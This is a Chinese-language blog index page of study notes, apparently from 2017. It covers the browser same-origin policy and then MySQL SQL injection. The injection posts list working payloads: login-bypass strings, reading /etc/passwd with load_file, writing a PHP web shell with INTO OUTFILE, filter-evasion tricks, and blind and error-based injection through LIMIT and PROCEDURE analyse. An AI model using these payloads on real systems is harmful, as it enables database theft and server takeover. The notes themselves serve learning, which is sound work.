<li>阻止跨域写操作，只要检测请求中的一个不可测的标记（CSRF token）即可，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。必须使用这个标记来阻止页面的跨站读操作</li>
<li>阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息</li>
<li>阻止跨站嵌入，确保你得资源不能是以上列出的可嵌入资源格式。多数情况下浏览器都不会遵守Conten-Type消息头。例如，如果你在<code>&lt;script&gt;</code> 标签中嵌入HTML文档，浏览器仍将HTML解析为Javascrip</li>
</ul>
<h3 id="跨源脚本API访问"><a href="#跨源脚本API访问" class="headerlink" title="跨源脚本API访问"></a>跨源脚本API访问</h3><p>Javascript的APIs中，如 <code>iframe.contentWindow</code>,<code>window.parent</code>, <code>window.open</code> 和 <code>window.opener</code> 允许文档间直接相互引用。当两个文档的源不同时，这些引用方式将对 Window 和 Location对象的访问添加限制。可以使用<code>window.postMessage</code> 作为替代方案，提供跨域文档间的通讯</p>
<h4 id="窗口："><a href="#窗口：" class="headerlink" title="窗口："></a>窗口：</h4><p>允许一下对窗口属性的跨源访问<br>Methods：<br>window.blur<br>window.close<br>window.focus<br>window.postMessage</p>
<p>Attributes<br>window.closed                只读<br>window.frames                只读<br>window.length                只读<br>window.location                读/写<br>window.opener                只读<br>window.parent                只读<br>window.self                        只读<br>window.top                        只读<br>window.window                只读</p>
<p>某些浏览器允许访问比规范允许的更多属性</p>
<h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p>允许一下对位置属性的跨源访问：<br>Methods<br>location.replace</p>
<p>Attributes<br>URLUtils.href</p>
<p>某些浏览器允许访问比规范允许的更多属性</p>
<h3 id="跨源数据存储访问"><a href="#跨源数据存储访问" class="headerlink" title="跨源数据存储访问"></a>跨源数据存储访问</h3><p>存储在浏览器中的数据，如localStorage和IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。</p>
<p>window.name属性可以用来临时存储数据，可以跨域访问</p>
<p>Cookies使用不同的源定义方式。一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀（public suffix）即可。Firefox和Chrome使用Public Suffix List决定一个域是否是一个公共后缀（public suffix）。不管使用哪个协议（HTTP/HTTPS）或端口号，浏览器都允许给定的域以及其任何子域名(sub-domains)来访问cookie。设置cookie时，你可以使用Domain，Path，Secure，和Http-Only标记来限定其访问性。读取cookie时，不会知晓它的出处。尽管使用安全的https连接，任何可见的cookie都是使用不安全的连接设置的</p>

          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/13/基本MySQL注入攻击/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/13/基本MySQL注入攻击/" itemprop="url">基本MySQL注入攻击</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-13T17:28:58+08:00">
                2017-09-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQL-Injection/" itemprop="url" rel="index">
                    <span itemprop="name">SQL Injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="注入常用函数与字符"><a href="#注入常用函数与字符" class="headerlink" title="注入常用函数与字符"></a>注入常用函数与字符</h3><p>控制语句操作(select,case,if(),…) <a href="http://bobao.360.cn/learning/detail/3758.html" target="_blank" rel="external">case用法</a><br>比较操作(=,like,mod(),…)<br>字符串的猜解操作(mid(),left(),rpad(),…)<br>字符串生成操作(0x61,hex(),conv()(使用conv[10-36],10,36)可以实现所有字符的表示))</p>
<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>下面的是MySQL中可以用到的注释符:</p>
<p>#,/<em>,–,;%00,–+,反引号（只能在语句尾使用,MySQL中的注释符）<br>examples:<br>`SELECT </em> FROM Users WHERE username = ‘’ OR 1=1 – -‘ AND password = ‘’;<br>SELECT * FROM Users WHERE id = ‘’ UNION SELECT 1, 2, 3`’;</p>
<p>其他的常规的就不写了。。。</p>
<h3 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h3><p>在MySQL中，存在一个称为secure_file_priv的全局变量，该变量用于限制数据的导入和导出操作，例如:<code>select ... into outfile</code>语句和LOAD_FILE()<br>如果secure_file_priv变量为空那么直接可以使用函数，如果为NULL是不能使用<br>本来应该默认为NULL的，但是不知道为什么我的wamp里的默认为空。。。</p>
<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>读文件LOAD_FILE()<br>Examples:<br><code>select load_file(&#39;/etc/passwd&#39;);</code><br><code>select load_file(0x272f6574632f70617373776427);</code><br>注意点：<br>load_file的默认目录是@@datadir<br>文件必须是当前用户可读<br>读文件最大的为1047552个byte,@@max_allowed_packet可以查看文件读取最大值</p>
<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>INTO OUTFILE/DUMPFILE<br>经典写文件例子:<br><code>select &#39;&lt;? system($_GET[\&#39;c\&#39;]); ?&gt; INTO OUTFILE &#39;/var/www/shell.php&#39;;</code><br>INTO OUTFILE 写文件时会在每一行的结束自动加上换行符<br>INTO DUMPFILE 写文件时会保证原生内容，这种适用于二进制文件<br>有一个文章讲，<a href="http://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="external">写文件讲解</a><br>注意点：<br>INTO OUTFILE不会覆盖文件<br>INTO OUTFILE必须是查询语句的最后一句<br>路径名是不能编码的，必须使用单引号</p>
<h3 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h3><p>带外通道攻击主要是利用其它协议或者渠道从服务器提取数据，它可能是HTTP(s)请求，DNS解析服务，SMB服务，Mail服务等</p>
<h4 id="条件限制"><a href="#条件限制" class="headerlink" title="条件限制"></a>条件限制</h4><p>这些函数是要绝对路径的<br>如果securre_file_priv变量为空那么可以直接使用函数，如果为NULL是不能使用</p>
<h4 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h4><p>这个没搞明白，先搁起来</p>
<h4 id="SMB-Relay-注入攻击"><a href="#SMB-Relay-注入攻击" class="headerlink" title="SMB Relay 注入攻击"></a>SMB Relay 注入攻击</h4><p>解释一下SMB Relay<br>假设有主机B与A<br>1.A向B发起连接请求<br>2.B向A发送挑战（一组随机数据，8字节）<br>3.A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B<br>4.</p>

          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/07/MySQL-一些注入技巧/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/07/MySQL-一些注入技巧/" itemprop="url">MySQL 一些注入技巧</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-07T14:29:07+08:00">
                2017-09-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQL-Injection/" itemprop="url" rel="index">
                    <span itemprop="name">SQL Injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="总结一下mysql中用的到的技巧"><a href="#总结一下mysql中用的到的技巧" class="headerlink" title="总结一下mysql中用的到的技巧"></a>总结一下mysql中用的到的技巧</h3><hr>
<p><strong>常量</strong>：true，false，null，\N，current_timestamp变量：@myvar:=1</p>
<p><strong>系统变量</strong>：@@version,@@datadir…..</p>
<p><strong>常用函数</strong>：version(),pi()(圆周率),pow(x,y)(返回X的Y次方,char(),substring()</p>
<p><strong>字符串生成</strong>：hex(),conv()(数字进制转换)</p>
<p><strong>有关于字符串生成的</strong>：true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6….</p>
<hr>
<h3 id="过滤的绕过"><a href="#过滤的绕过" class="headerlink" title="过滤的绕过"></a>过滤的绕过</h3><p> <em>空格</em>：%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释  </p>
<p> <em>and，or</em>：||，&amp;&amp; </p>
<p> <em>union select</em>：<br> 利用括号，’and(true)like(false)union(select(pass)from(users))，<br> 方括号union [all|distinct] select pass from users#，  union%a0select pass from users，<br> 或者内联注释union/<em>&amp;sort=</em>/select pass from users#  </p>
<p> <em>union</em>：子查询进行盲注and length((select pass from users having substr(pass,1,1)=’a’))  </p>
<p> <em>having</em>：and(select substr(group_concat(pass),1,1)from users)=’a  </p>
<p> <em>select … from(过滤代码如/SELECT\s+[A-Za-z.]+\s+FROM/i/i)</em>：<br>select [all|distinct] pass from users  select<code>table_name</code>from<code>information_schema</code> . <code>tables</code><br>select pass as alias from users  select pass aliasalias from users<br>select pass<code>alias alias</code>from users  select+pass%a0from(users)  </p>
<p> <em>select,and,&amp;</em>：  这里就是可以利用上一篇文章中提到的false注入的方式进行绕过，具体见上文</p>
<p> <em>不使用逗号</em>：’ and substr(data from 1 for 1) = ‘a’#</p>
<h3 id="不同情境的注入技巧"><a href="#不同情境的注入技巧" class="headerlink" title="不同情境的注入技巧"></a>不同情境的注入技巧</h3><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p> 有时候可以利用一些逻辑语句进行注入<br> <code>if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)</code></p>
<h4 id="Limit"><a href="#Limit" class="headerlink" title="Limit"></a>Limit</h4><p>  limit后面可以跟两个函数，PROCEDURE 和 INTO（需要写权限）<br>  利用PROCEDURE 有两种方式，基于报错和时间，参考文章<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="external">MySQL下Limit注入方法</a><br>  5.6以上好像不行了QAQ。。。。。<br>  基于报错<br>  <code>mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></p>
<p>  基于时间<br>  <code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
<h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p> order by 后面的数字也可以作为一个注入点，参考文章<a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="external">MySQL Order By 注入总结</a><br> 这里就不多写了</p>
<h4 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h4><h5 id="不常用函数绕过滤"><a href="#不常用函数绕过滤" class="headerlink" title="不常用函数绕过滤"></a>不常用函数绕过滤</h5><p> <code>lpad(data,1,space(1))  // lpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;??hi&#39;</code><br> <code>rpad(data,1,space(1)) // rpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;hi??&#39;</code></p>
<h5 id="搜索匹配类的函数"><a href="#搜索匹配类的函数" class="headerlink" title="搜索匹配类的函数"></a>搜索匹配类的函数</h5><p> <code>&#39;-if(locate(&#39;f&#39;,data),1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;fo&#39;,data)1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;foo&#39;,data),1,0)#&#39;</code><br> <code>instr()</code><br> <code>position()</code></p>
<h5 id="使用函数进行字符串切割"><a href="#使用函数进行字符串切割" class="headerlink" title="使用函数进行字符串切割"></a>使用函数进行字符串切割</h5><p><code>length(trim(leading &#39;a&#39; from data))</code><br><code>length(replace(data,&#39;a&#39;,&#39;&#39;))</code></p>
<h4 id="关于PHP中md5的一个姿势"><a href="#关于PHP中md5的一个姿势" class="headerlink" title="关于PHP中md5的一个姿势"></a>关于PHP中md5的一个姿势</h4><p>例如，PHP中有这么一段SQL语句<br><code>$sql = &quot;select * from admin where pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code><br>这里是可以注入的，关于PHP中md5函数<br>如果可选的raw_output被设置为TRUE，那么md5报文摘要将以16字节长度的原始二进制返回<br><strong>就是说找到一个字符串md5的二进制和字符编码中的某些编码对上，就会产生注入，这里贴出一个原文作者找到的字符串，ffifdyop,md5加密后对应的字符串是 <code>&#39;or&#39;&lt;trash&gt;</code></strong><br><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="external">原文</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/06/MySQL-False注入姿势学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/06/MySQL-False注入姿势学习/" itemprop="url">MySQL False 注入姿势学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-06T21:43:32+08:00">
                2017-09-06
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SQL-Injection/" itemprop="url" rel="index">
                    <span itemprop="name">SQL Injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="http://bobao.360.cn/learning/detail/3804.html" target="_blank" rel="external">原文链接</a></p>
<h3 id="0x01-False-Injection"><a href="#0x01-False-Injection" class="headerlink" title="0x01 False Injection"></a>0x01 False Injection</h3><p>首先是看了文章之后知道了一个MySQL的特性<br>    <code>select * from user where username=0;</code><br>    <img src="./images/1.png" alt="enter description here" title="1"></p>
<p>这条语句指向之后会返回所有值</p>
<p>   <code>select * from users where password=0;</code><br>   <img src="./images/2.png" alt="enter description here" title="2"></p>
<p> 这里涉及到了MySQL的隐式类型转换</p>
<p>  官方文档是这样写的：<br>      <em>The following rules describe how conversion occurs for comparison operations:</em></p>
<p><em>If one or both arguments are NULL, the result of the comparison is NULL, except for the NULL-safe &lt;=&gt; equality comparison operator. For NULL &lt;=&gt; NULL, the result is true. No conversion is needed.</em></p>
<p><em>If both arguments in a comparison operation are strings, they are compared as strings.</em></p>
<p><em>If both arguments are integers, they are compared as integers.</em></p>
<p><em>Hexadecimal values are treated as binary strings if not compared to a number.</em></p>
<p><em>If one of the arguments is a TIMESTAMP or DATETIME column and the other argument is a constant, the constant is converted to a timestamp before the comparison is performed. This is done to be more ODBC-friendly. Note that this is not done for the arguments to IN()! To be safe, always use complete datetime, date, or time strings when doing comparisons. For example, to achieve best results when using BETWEEN with date or time values, use CAST() to explicitly convert the values to the desired data type.</em></p>
<p><em>If one of the arguments is a decimal value, comparison depends on the other argument. The arguments are compared as decimal values if the other argument is a decimal or integer value, or as floating-point values if the other argument is a floating-point value.</em></p>
<p><em>In all other cases, the arguments are compared as floating-point (real) numbers</em></p>
<hr>
<p>大概意思就是：<br>    如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;=&gt;NULL 会返回1。不做类型转换</p>
<p>   两个参数都是字符串，按照字符串比较。不做类型转换</p>
<p>   两个参数都是整数，按照整数比较。不做类型转换</p>
<p>   如果不与数字进行比较，则将十六进制值视为二进制字符串。</p>
<p>   有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳</p>
<p>   有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</p>
<p>   所有其他情况下，两个参数都会被转换为浮点数再进行比较</p>
<p>最重要的是下面这句话，这是利用点：<br>    <strong>字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</strong></p>
<p>那么，将字符串转换的时候会产生一个warning，转换的结果为0，但是如果字符串的开头是数字的时候会从数字部分截断，转换为数字，所以上面为什么会返回所有值就可以理解了。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><code>where username=&#39;&#39;+&#39;&#39;;</code><br><code>where username=&#39;&#39;-&#39;&#39;;</code><br><code>where username=&#39;&#39;*&#39;&#39;;</code><br><code>where username=&#39;&#39;/6;</code><br><code>where username=&#39;&#39;%1;</code><br><code>where username=&#39;&#39;&amp;0;</code><br><code>where username=&#39;&#39;|0;</code><br><code>where username=&#39;&#39;^0;</code></p>
<h6 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h6><p><code>&lt;&lt;0# &#39;&gt;&gt;0</code></p>
<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p><code>where username=&#39;&#39;=0&lt;=&gt;1;</code><br><code>where username=&#39;&#39;=0&lt;&gt;0;</code><br><code>where username=&#39;&#39;&gt;-1;</code></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><code>&#39;+1 is not null#  &#39;in(-1,1)#  &#39;not in(1,0)#  &#39;like 1#  &#39;REGEXP 1#  &#39;BETWEEN 1 AND 1#  &#39;div 1#  &#39;xor 1#  &#39;=round(0,1)=&#39;1  &#39;&lt;&gt;ifnull(1,2)=&#39;1</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/05/new-article/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/05/new-article/" itemprop="url">new article</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-05T17:02:39+08:00">
                2017-09-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://alisitaweb.github.io/2017/09/05/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yuanbo">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/aaa.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Alisita's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/05/hello-world/" itemprop="url">Test</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-05T10:26:15+08:00">
                2017-09-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          
            <img class="site-author-image" itemprop="image"
              src="/images/aaa.jpg"
              alt="yuanbo" />
          
            <p class="site-author-name" itemprop="name">yuanbo</p>
            <p class="site-description motion-element" itemprop="description"></p>
        </div>

        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">9</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">3</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/AlisitaWeb" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>GitHub</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="undefined" target="_blank" title="CSDN">
                  
                    <i class="fa fa-fw fa-globe"></i>CSDN</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.jianshu.com/u/5695b31e062f" target="_blank" title="简书">
                  
                    <i class="fa fa-fw fa-globe"></i>简书</a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yuanbo</span>

  
</div>



        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>


  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  








  





  

  

  

  

  

  

</body>
</html>
